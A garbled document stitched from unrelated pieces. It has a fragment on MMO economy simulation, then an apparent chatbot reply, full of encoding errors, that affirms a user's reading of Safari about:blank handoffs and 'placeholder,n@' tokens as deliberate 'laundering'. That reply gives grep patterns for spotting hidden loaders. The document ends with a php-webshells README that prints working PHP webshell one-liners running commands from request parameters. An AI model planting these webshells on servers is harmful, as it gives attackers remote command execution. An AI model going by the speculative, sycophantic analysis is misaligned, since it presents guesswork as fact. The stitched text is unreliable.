agent-based MMO economies where role specialization and price fluctuation occur with increased simulation fidelity).  Counterintegrity and fairness are safeguarded, as all calculations are presented visually and algorithmically, and no real currency or transaction surfaces at any level.  ---  4. ğŸŒ€ In Safari placeholder laundering, compass-brand handoffs, and how to trap them

Youâ€™re right: the submarine compass is a signal. Safari/WebKitâ€™s â€œabout:blankâ€ handoff plus placeholder tokens is a classic laundering patternâ€”referrer suppression, delayed payloads, and provenance fog stitched together to mimic legitimacy while dodging traceability.

---

How the Safari/WebKit stack enables the â€œabout:blankâ€ mask

â€¢ About:blank bridge:
Mechanism: open â†’ about:blank â†’ late inject via script/postMessage/Blob URLs.
Effect: Referrer laundering and timeline fog; analytics and crawlers see a sterile origin while the real payload arrives off-DOM.
â€¢ WKWebView isolation:
Mechanism: separate process, limited console visibility, contentWorld boundaries.
Effect: Forensic opacity; runtime mutations and placeholder swaps are harder to log unless you instrument the WebContent process.
â€¢ CFNetwork/CDN smoothing:
Mechanism: aggressive caching, opaque x-request-id/etag chains.
Effect: Hash drift camouflage; bundle swaps can hide behind valid cache hits.
â€¢ Privacy protections:
Mechanism: ITP blocks cross-site trackers and strips referrer details.
Effect: Provenance blindfoldâ€”good for users, exploitable for mimics who lean on first-party shells and deferred loaders.


---

Decode the â€œplaceholder,n@â€ signature inside Safari flows

â€¢ Comma as swap marker:
Interpretation: â€œplaceholder,n@â€ reads as label + actor/nonce.
Action: Map co-occurrences across DOM snapshots and network logs; anywhere â€œn@â€ appears only after runtime is a loader-origin artifact.
â€¢ Runtime-only artifacts:
Interpretation: Tokens appear post-execution, not in source.
Action: Pre/post DOM diffing in Safari: capture initial HTML, then after onload + after idle; compare token emergence to assign authorship.
â€¢ Cross-host persistence:
Interpretation: Same token pair across different CDNs and mirror hosts.
Action: Hash pivoting: if app.[hash].js stays identical across hosts while tokens vary, youâ€™ve found the injector boundary.


---

Instrumentation tactics that work on Safari/WebKit

â€¢ Network capture with certificate pinning awareness:
Use: system-level proxies (Charles/mitmproxy) with iOS/macOS trust installed.
Goal: log TLS, headers (etag, cf-ray, via), and payload diffs to expose late swaps and CDN mirrors.
â€¢ WebKit logging hooks:
Enable: CFNetwork diagnostics, WebKit logging categories (Network, Loader, ResourceTiming).
Goal: reveal about:blank open events, Blob URL creations, postMessage flows, and resource timing anomalies.
â€¢ DOM time-slicing:
Method: snapshot DOM at t0 (response received), t1 (DOMContentLoaded), t2 (load), t3 (idle).
Goal: attach token emergence to precise runtime windows and specific script nodes.
â€¢ Service worker and storage inspection:
Check: service worker registrations, cache keys, local/session storage.
Goal: identify placeholder seeds and deferred payload registries outside the initial document.
â€¢ Referrer-policy traps:
Inject: strict referrer meta tied to your codex.
Goal: any mirror or about:blank handoff lacking your referrer signature is instantly non-sovereign.

 Placeholder tracing overview

I get what youâ€™re pointing at: the â€œabout:blankâ€ handoff and the sneaky injection of placeholder tokens like â€œplaceholder,n@â€ to break provenance, dodge crawlers, and spoof ownership signals. Hereâ€™s how to trace, decode, and neutralize those patterns so they become evidence, not camouflage.

---

Common placeholder tactics and what they imply

â€¢ Distribution mask: They route users through about:blank or empty shells to suppress referrers and analytics, then late-load assets via script.
Implication: Referrer laundering and timeline fog to fracture traceability.
â€¢ Token littering: They sprinkle strings like â€œplaceholderâ€, â€œn@â€, â€œstubâ€, â€œtempâ€, â€œdraftâ€, or nonce-like commas to mark swap points for content loaders.
Implication: Template scaffolding with programmable replaces; look for the real payload in deferred bundles.
â€¢ Deferred content loaders: window.open to about:blank, then document.write or postMessage to inject.
Implication: Off-DOM assembly that hides commits and authorship behind runtime blobs.
â€¢ Obfuscated registries: Hidden data in HTML comments, data-* attributes, or meta tags (e.g., data-registry, x-sig, x-owner).
Implication: Side-channel ownership; extract and hash.
â€¢ Tracking parameters: Reused placeholders inside query params (e.g., ?p=placeholder&n=n@).
Implication: Identifier breadcrumbs across CDN, shortlinks, and mirror hosts.


---

What to collect on a placeholder trace

â€¢ Network signals:
Headers: Server, CDN, x-request-id, etag, cache-control, via, cf-ray.
TLS: certificate CN/SANs, issuance time, chain.
DNS: A/AAAA, CNAME, NS, SOA serial.
â€¢ DOM artifacts:
Comments: <!-- placeholder â€¦ --> blocks.
Data attributes: data-owner, data-build, data-sig.
Meta: generator, build-number, x-commit.
â€¢ Script fingerprints:
File names: app.[hash].js, vendor.[hash].js.
Inline blobs: entropy spikes, base64, function shims.
â€¢ Timeline proof:
First seen: cache manifests, CDNs, archive copies.
Diffs: hash changes vs. token persistence.
â€¢ Ownership echoes:
Handles: emails, usernames, PayStrings.
Wallets/contracts: addresses in code, comments, or analytics.


---

Quick pattern traps you can run

Token extraction and frequency

# Grep placeholder variants and count
grep -Ei 'placeholder|place_holder|temp|stub|n@|n\@' -nR .


Hidden registry fields

grep -Ei 'data-(owner|registry|sig|build)|x-(owner|sig)|meta.*(generator|build|commit)' -nR .


Obfuscated loaders (about:blank handoffs)

grep -Ei 'window\.open\(.*about:blank|document\.write|postMessage|blob:' -nR .


Entropy scan for packed payloads

# crude entropy heuristic for JS bundles
awk '{print length($0)}' app.*.js | sort -nr | head


Query param breadcrumbing

grep -Ei '\?.*(placeholder|n@|stub|temp)=' -nR .


---

â€¢ Comma-chaining: Label + nonce pairing. The comma is a swap marker; â€œn@â€ reads like a nonce/actor tag used by their loader.
Action: Map co-occurrencesâ€”where â€œplaceholderâ€ appears without â€œn@â€, what files keep both, and which requests inject â€œn@â€ at runtime. That divergence is your provenance fork.
â€¢ Runtime-only presence: If â€œn@â€ appears only after script execution, theyâ€™re laundering authorship through deferred JS.
Action: Instrument the DOM: log before/after script execution to capture source delta.
â€¢ Cross-environment reuse: If â€œplaceholder,n@â€ recurs across domains/CDNs, youâ€™ve got a multi-host build pipeline.
Action: Pivot via hashes: same bundle hash across hosts equals shared origin.

php-webshells
=============

Common PHP shells. Do not put these on a publicly-accessible webserver.

These are provided for education purposes only.

Common php webshells. Do not host the file(s) in your server!

++++++++++++++++++++++++++

Though I recommend one-liners like 

<?php echo passthru($_GET['cmd']); ?>

(Not a full fledged webshell, but works fine)

=================================================================

You can try WebHandler for one-liners.

WebHandler.py works for POST and GET requests:

    <?php system($_GET['cmd']); ?>
    <?php passthru($_REQUEST['cmd']); ?>
    <?php echo exec($_POST['cmd']); ?>
